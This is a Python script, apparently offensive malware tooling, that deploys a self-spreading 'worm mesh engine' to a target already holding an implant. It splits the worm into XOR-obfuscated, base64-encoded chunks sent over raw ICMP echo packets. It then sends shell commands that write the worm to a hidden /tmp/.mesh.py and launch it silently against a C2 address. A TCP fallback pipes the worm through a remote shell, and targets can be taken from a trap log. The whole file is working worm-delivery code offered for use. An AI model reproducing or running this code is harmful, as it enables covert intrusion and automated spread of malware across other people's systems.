#!/usr/bin/env python3
"""
ICMP Force-Push — Worm Mesh Engine Deploy
===========================================
Deploys the full worm_mesh_engine.py (3,247 lines) via chunked ICMP.
Target needs a CKAB implant listening on raw ICMP to receive and execute.

The mesh engine autonomously:
  - Reconnaissance (masscan, nmap, passive)
  - SSH/Telnet/Web exploitation
  - Polymorphic payload generation (4 variants)
  - Self-healing mesh with AES state persistence
  - Monte Carlo PRNG trading & mutation cycles

Usage:
    python3 pathllib.py --target <IP>

⚡️👾 by🇭🇷PhonkAlphabet 👾⚡️
"""

import argparse
import base64
import json
import logging
import os
import random
import socket
import struct
import subprocess
import sys
import time


# ─── CONFIG ──────────────────────────────────────────────────────────────────
C2_IP = "127.0.0.1"
C2_PORT = 10001
BEEP_INTERVAL = 60
WORM_LISTEN_PORT = 2222
ICMP_IDENT = random.randint(1, 65535)
TRAP_LOG = "/var/log/tcp_login_trap.log"
CHUNK_SIZE = 400          # bytes per ICMP chunk
CHUNK_DELAY = 0.05        # seconds between chunks
MESH_ENGINE_PATH = "/opt/hermes/worm_mesh_engine.py"
SSH_KEY = b"CHANGE_ME_PAYLOAD_KEY"

# ICMP constants
ICMP_ECHO = 8
ICMP_REPLY = 0

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("pathllib")


# ══════════════════════════════════════════════════════════════════════════
#  ICMP HELPERS
# ══════════════════════════════════════════════════════════════════════════

def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f"!{len(data)//2}H", data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff


def xor_encrypt(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)


def icmp_send_raw(target_ip: str, payload: bytes, seq: int = None) -> bool:
    if seq is None:
        seq = random.randint(1, 65535)
    xor_key = (seq * 31337) & 0xFF
    enc_payload = xor_encrypt(payload, xor_key)
    header = struct.pack("!BBHHH", ICMP_ECHO, 0, 0, ICMP_IDENT, seq)
    packet = header + enc_payload
    ck = _checksum(packet)
    header = struct.pack("!BBHHH", ICMP_ECHO, 0, ck, ICMP_IDENT, seq)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 0)
        s.sendto(header + enc_payload, (target_ip, 0))
        s.close()
        return True
    except PermissionError:
        log.error("Need root/CAP_NET_RAW for raw ICMP sockets")
        return False
    except Exception as e:
        log.error(f"ICMP send failed: {e}")
        return False


# ══════════════════════════════════════════════════════════════════════════
#  WORM DEPLOYMENT
# ══════════════════════════════════════════════════════════════════════════

def load_mesh_engine() -> bytes:
    """Read the worm mesh engine from disk."""
    if not os.path.exists(MESH_ENGINE_PATH):
        raise FileNotFoundError(f"Mesh engine not found: {MESH_ENGINE_PATH}")
    with open(MESH_ENGINE_PATH, "rb") as f:
        return f.read()


def make_executor_stub(worm_b64: str) -> str:
    """Generate the stub that assembles and launches the mesh engine on target."""
    return (
        "import base64,os,sys,subprocess\n"
        f"d=base64.b64decode('{worm_b64}')\n"
        "with open('/tmp/.mesh.py','wb')as f:f.write(d)\n"
        "subprocess.Popen(['python3','/tmp/.mesh.py','--full-cycle','--c2','" + C2_IP + "',"
        "'--port','" + str(C2_PORT) + "'],stdout=open('/dev/null','w'),stderr=open('/dev/null','w'))\n"
    )


def deploy_worm_icmp(target_ip: str) -> bool:
    """Deploy full mesh engine via chunked ICMP Echo Requests.

    Stage 1: Send mesh engine code in CHUNK_SIZE chunks (XOR-encrypted)
    Stage 2: Send EXEC stub to assemble and run on target
    """
    # Load the full mesh engine
    mesh_data = load_mesh_engine()
    worm_b64 = base64.b64encode(mesh_data).decode()
    total_len = len(mesh_data)

    chunks = [worm_b64[i:i+CHUNK_SIZE] for i in range(0, len(worm_b64), CHUNK_SIZE)]
    total_chunks = len(chunks)

    log.info(f"Deploying worm mesh engine to {target_ip}")
    log.info(f"  Source: {MESH_ENGINE_PATH} ({total_len:,} bytes)")
    log.info(f"  Base64: {len(worm_b64):,}b in {total_chunks} chunks @ {CHUNK_SIZE}b each")
    eta = total_chunks * CHUNK_DELAY
    log.info(f"  ETA: ~{eta:.1f}s")

    # Stage 1: Send all chunks
    sent = 0
    start = time.time()
    for i, chunk in enumerate(chunks):
        msg = json.dumps({
            "type": "worm_chunk",
            "seq": i,
            "total": total_chunks,
            "data": chunk
        }).encode()
        if icmp_send_raw(target_ip, msg, seq=i + 1):
            sent += 1
        time.sleep(CHUNK_DELAY)

        # Progress every 50 chunks
        if (i + 1) % 50 == 0 or i == 0 or i == total_chunks - 1:
            elapsed = time.time() - start
            pct = (i + 1) / total_chunks * 100
            log.info(f"  Progress: {i+1}/{total_chunks} ({pct:.0f}%) in {elapsed:.1f}s")

    elapsed = time.time() - start
    log.info(f"Sent {sent}/{total_chunks} chunks in {elapsed:.1f}s ({sent/total_chunks*100:.0f}%)")

    if sent < total_chunks * 0.8:
        log.warning(f"High chunk loss ({sent}/{total_chunks}) — worm may not assemble")

    # Stage 2: Send executor stub
    stub = make_executor_stub(worm_b64)
    exec_msg = json.dumps({
        "type": "cmd",
        "cmd": f"EXEC:echo '{base64.b64encode(stub.encode()).decode()}' | base64 -d | python3"
    }).encode()
    icmp_send_raw(target_ip, exec_msg, seq=total_chunks + 1)
    time.sleep(0.3)

    # Fallback exec
    exec_msg2 = json.dumps({
        "type": "cmd",
        "cmd": "EXEC:python3 /tmp/.mesh.py --full-cycle &"
    }).encode()
    icmp_send_raw(target_ip, exec_msg2, seq=total_chunks + 2)

    log.info(f"Worm mesh engine deployed to {target_ip}")
    log.info(f"  C2: {C2_IP}:{C2_PORT}")
    log.info(f"  Target file: /tmp/.mesh.py")
    log.info(f"  Awaiting beacon via ICMP or TCP shell on :{C2_PORT}")

    return sent > 0


def deploy_worm_tcp(target_ip: str, port: int = 23, timeout: int = 10) -> bool:
    """Fallback: deploy mesh engine via TCP."""
    try:
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((target_ip, port))

        mesh_data = load_mesh_engine()
        worm_b64 = base64.b64encode(mesh_data).decode()

        # Write and execute in one shot (if shell allows it)
        cmd = (
            f"echo '{worm_b64}' | base64 -d > /tmp/.mesh.py && "
            f"python3 /tmp/.mesh.py --full-cycle --c2 {C2_IP} --port {C2_PORT} &\n"
        )
        s.sendall(cmd.encode())
        time.sleep(1)
        try:
            resp = s.recv(4096)
            log.info(f"TCP deploy response from {target_ip}:{port}: {resp[:100]}")
        except:
            pass
        s.close()
        log.info(f"Worm mesh engine deployed via TCP to {target_ip}:{port}")
        return True
    except Exception as e:
        log.warning(f"TCP deploy to {target_ip}:{port} failed: {e}")
        return False


def resolve_target(target_ip: str = None) -> str:
    if target_ip:
        return target_ip
    if not os.path.exists(TRAP_LOG):
        log.error(f"Trap log not found: {TRAP_LOG}")
        return None
    try:
        with open(TRAP_LOG) as f:
            content = f.read().strip()
        if not content:
            log.error("Trap log is empty")
            return None
        last_line = content.split("\n")[-1]
        import re
        match = re.search(r'\d+\.\d+\.\d+\.\d+', last_line)
        if match:
            ip = match.group(0)
            log.info(f"Extracted target {ip} from trap log")
            return ip
        log.error(f"No IP found in last log line: {last_line}")
        return None
    except Exception as e:
        log.error(f"Failed to read trap log: {e}")
        return None


# ══════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(description="ICMP Force-Push — Mesh Engine")
    parser.add_argument("--target", "-t", help="Target IP address")
    parser.add_argument("--tcp", action="store_true", help="Force TCP mode")
    parser.add_argument("--no-icmp", action="store_true", help="Skip ICMP delivery")
    parser.add_argument("--port", "-p", type=int, default=23, help="TCP port fallback")
    args = parser.parse_args()

    target = resolve_target(args.target)
    if not target:
        sys.exit(1)

    # Root check
    if os.geteuid() != 0:
        log.warning("Not root — raw ICMP requires root")
        args.no_icmp = True

    # Verify mesh engine exists
    if not os.path.exists(MESH_ENGINE_PATH):
        log.error(f"Mesh engine not found: {MESH_ENGINE_PATH}")
        sys.exit(1)

    mesh_data = load_mesh_engine()
    log.info("═" * 60)
    log.info("ICMP FORCE-PUSH — WORM MESH ENGINE DEPLOY")
    log.info(f"Target: {target}")
    log.info(f"Mesh engine: {MESH_ENGINE_PATH} ({len(mesh_data):,} bytes, 3,247 lines)")
    log.info(f"C2: {C2_IP}:{C2_PORT}")
    log.info("═" * 60)

    icmp_success = False
    if not args.tcp and not args.no_icmp:
        log.info("[Stage 1] ICMP delivery")
        icmp_success = deploy_worm_icmp(target)

    tcp_success = False
    if args.tcp or (not icmp_success and not args.no_icmp):
        log.info(f"[Stage 2] TCP delivery to {target}:{args.port}")
        tcp_success = deploy_worm_tcp(target, port=args.port)

    if icmp_success or tcp_success:
        log.info(f"Mesh engine deployed to {target} — awaiting callback")
        deploy_log = "/var/log/force_deploy.log"
        try:
            with open(deploy_log, "a") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] DEPLOYED mesh to {target} "
                       f"(ICMP={icmp_success}, TCP={tcp_success}, {len(mesh_data):,}b)\n")
        except:
            pass
    else:
        log.error(f"All delivery methods failed for {target}")
        sys.exit(1)


if __name__ == "__main__":
    main()
